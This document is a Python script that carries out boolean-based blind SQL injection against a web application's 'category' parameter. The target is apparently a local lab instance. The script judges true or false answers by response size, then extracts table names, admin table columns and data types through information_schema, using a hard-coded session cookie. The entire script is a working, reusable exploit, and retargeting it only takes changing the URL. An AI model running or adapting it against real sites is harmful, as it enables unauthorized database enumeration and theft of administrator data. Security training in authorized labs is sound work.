import requests
import sys
import time

# Constants
TARGET_URL = 'http://127.0.0.1:32780/'
TRUE_SIZE = 1487
FALSE_LOWER = 1484
FALSE_UPPER = 1486

# Session with cookie
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

def send_payload(payload):
    """Send payload and return True/False based on response size"""
    # Build the full URL with proper encoding
    url = f"{TARGET_URL}?category=Nature'{payload}"
    
    try:
        response = session.get(url, timeout=10)
        content_size = len(response.content)
        
        # TRUE condition (1487 bytes)
        if content_size == TRUE_SIZE:
            return True
        # FALSE condition (1484-1486 bytes)
        elif FALSE_LOWER <= content_size <= FALSE_UPPER:
            return False
        else:
            # Unexpected size, print warning
            print(f"[!] Unexpected response size: {content_size} bytes")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None

def extract_length(query):
    """Extract the length of a query result using binary search"""
    max_len = 100
    min_len = 0
    
    # First find the approximate length using exponential search
    length = 1
    while length <= max_len:
        payload = f" AND LENGTH(({query})) > {length} -- "
        result = send_payload(payload)
        if result is None:
            return None
        if not result:
            break
        length *= 2
    
    # Binary search for exact length
    low = 0
    high = min(length, max_len)
    
    while low < high:
        mid = (low + high) // 2
        payload = f" AND LENGTH(({query})) > {mid} -- "
        result = send_payload(payload)
        if result is None:
            return None
        if result:
            low = mid + 1
        else:
            high = mid
    
    return low

def extract_string(query, max_len):
    """Extract string result using binary search per character"""
    result = ""
    
    for pos in range(1, max_len + 1):
        # Binary search for ASCII value (printable range)
        low = 32  # Space character
        high = 126  # Tilde
        
        while low <= high:
            mid = (low + high) // 2
            # Using SUBSTRING to extract character at position
            payload = f" AND ASCII(SUBSTRING(({query}),{pos},1)) > {mid} -- "
            result_bool = send_payload(payload)
            
            if result_bool is None:
                return None
            
            if result_bool:
                low = mid + 1
            else:
                high = mid - 1
        
        ascii_val = low
        if ascii_val < 32 or ascii_val > 126:
            # Non-printable character, likely end of string
            break
            
        char = chr(ascii_val)
        
        # Verify this character is correct
        verify_payload = f" AND ASCII(SUBSTRING(({query}),{pos},1)) = {ascii_val} -- "
        if send_payload(verify_payload):
            result += char
        else:
            # Character extraction failed
            break
        
        # Check if we've reached the end (null character)
        if ascii_val == 0:
            break
    
    return result

def extract_table_names(limit=15):
    """Extract table names from information_schema.tables"""
    print("[*] Extracting table names...")
    tables = []
    
    for i in range(limit):
        # Get table name length
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT {i},1"
        length = extract_length(query)
        
        if length is None or length == 0:
            print(f"[!] Failed to extract table {i} or no more tables")
            break
        
        # Extract table name
        table_name = extract_string(query, length)
        
        if table_name:
            print(f"[+] Table {i}: {table_name}")
            tables.append(table_name)
        else:
            print(f"[-] Failed to extract table name {i}")
    
    return tables

def extract_columns(table_name):
    """Extract column names and data types from specified table"""
    print(f"[*] Extracting columns from table '{table_name}'...")
    columns = []
    
    # Try to get column count
    count_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name = '{table_name}'"
    count = extract_integer(count_query)
    
    if count is None or count == 0:
        count = 15  # Default to 15 columns if we can't get count
    
    print(f"[*] Extracting up to {count} columns from {table_name}")
    
    for i in range(count):
        # Extract column name
        name_query = f"SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}' LIMIT {i},1"
        name_length = extract_length(name_query)
        
        if name_length is None or name_length == 0:
            print(f"[!] No more columns found at position {i}")
            break
        
        column_name = extract_string(name_query, name_length)
        
        if not column_name:
            print(f"[-] Failed to extract column name {i}")
            continue
        
        # Extract data type
        type_query = f"SELECT data_type FROM information_schema.columns WHERE table_name = '{table_name}' AND column_name = '{column_name}' LIMIT 0,1"
        type_length = extract_length(type_query)
        
        data_type = ""
        if type_length and type_length > 0:
            data_type = extract_string(type_query, min(type_length, 50))
        
        columns.append((column_name, data_type))
        print(f"[+] Column {i}: {column_name} ({data_type})")
    
    return columns

def extract_integer(query):
    """Extract integer value from query"""
    # Use binary search for integer value
    low = 0
    high = 1000  # Reasonable upper limit
    
    # Exponential search first
    exp = 1
    while exp <= high:
        payload = f" AND ({query}) > {exp} -- "
        result = send_payload(payload)
        if result is None:
            return None
        if result:
            exp *= 10
        else:
            break
    
    high = min(exp, high)
    
    # Binary search
    while low < high:
        mid = (low + high) // 2
        payload = f" AND ({query}) > {mid} -- "
        result = send_payload(payload)
        if result is None:
            return None
        if result:
            low = mid + 1
        else:
            high = mid
    
    return low

def main():
    print("[*] Starting database enumeration...")
    print("[*] Target: Boolean-based Blind SQLi at http://127.0.0.1:32780/")
    print("[*] TRUE = 1487 bytes, FALSE = 1484-1486 bytes")
    print(f"[*] Using PHPSESSID: a619c2d322b0d2025997d9751eb6d09a")
    print("-" * 60)
    
    # Step 1: Extract table names
    tables = extract_table_names(limit=15)
    
    if not tables:
        print("[-] Failed to extract any table names")
        sys.exit(1)
    
    print(f"\n[*] Total tables found: {len(tables)}")
    print("[*] Tables:", ", ".join(tables))
    
    # Step 2: Find and extract columns from admins table
    admins_table = None
    for table in tables:
        if 'admin' in table.lower():
            admins_table = table
            print(f"\n[+] Found admin table: {admins_table}")
            break
    
    if not admins_table:
        print("[-] No admin table found. Checking all tables...")
        # If no admin found, try to extract from first few tables
        for table in tables[:3]:
            columns = extract_columns(table)
            if columns:
                print(f"\n[+] Schema for table '{table}':")
                for col_name, col_type in columns:
                    print(f"  {col_name:<18} {col_type}")
        return
    
    # Extract columns from admins table
    columns = extract_columns(admins_table)
    
    if not columns:
        print(f"[-] Failed to extract columns from {admins_table}")
        sys.exit(1)
    
    # Display complete schema
    print(f"\n{'='*60}")
    print(f"COMPLETE SCHEMA FOR TABLE: {admins_table}")
    print(f"{'='*60}")
    print(f"{'Column Name':<20} {'Data Type'}")
    print(f"{'-'*60}")
    
    for col_name, col_type in columns:
        print(f"{col_name:<20} {col_type}")
    
    print(f"{'='*60}\n")
    
    print("[*] Enumeration complete!")

if __name__ == "__main__":
    main()

